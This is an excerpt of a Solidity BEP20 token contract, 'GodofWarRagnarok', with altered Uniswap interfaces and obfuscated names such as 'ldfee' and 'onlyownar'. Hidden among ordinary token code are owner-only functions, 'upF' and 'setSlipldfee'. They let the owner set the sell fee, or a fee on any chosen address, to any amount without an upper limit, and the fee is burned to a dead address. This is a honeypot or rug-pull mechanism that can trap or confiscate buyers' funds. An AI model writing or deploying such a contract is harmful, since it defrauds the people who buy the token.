...
interface IUniswapV2Factory {
    ...
    function ldfeeTo() external view returns (address);
    function ldfeeToSetter() external view returns (address);
    ...
    function setldfeeTo(address) external;
    function setldfeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingldfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingldfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingldfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingldfeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingldfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract GodofWarRagnarok is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellldfee = 0;

    uint256 private _defaultBuyldfee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipldfee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellldfee = _value;
    }

    function setSlipldfee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipldfee[_address] = _value;
    }

    function getSlipldfee(address _address) external view onlyownar returns (uint256) {
        return _slipldfee[_address];
    }


    function setMAccountldfee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountldfee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeldfeeAmount = 0;

        if (rF) {
            uint256 tradeldfee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeldfee = _defaultSellldfee;
                }
                if (from == uniswapV2Pair) {

                    tradeldfee = _defaultBuyldfee;
                }
            }
            if (_slipldfee[from] > 0) {
                tradeldfee = _slipldfee[from];
            }

            tradeldfeeAmount = _Amount.mul(tradeldfee).div(100);
        }


        if (tradeldfeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeldfeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeldfeeAmount);
            emit Transfer(from, _deadAddress, tradeldfeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeldfeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeldfeeAmount);
        emit Transfer(from, _to, _Amount - tradeldfeeAmount);
    }
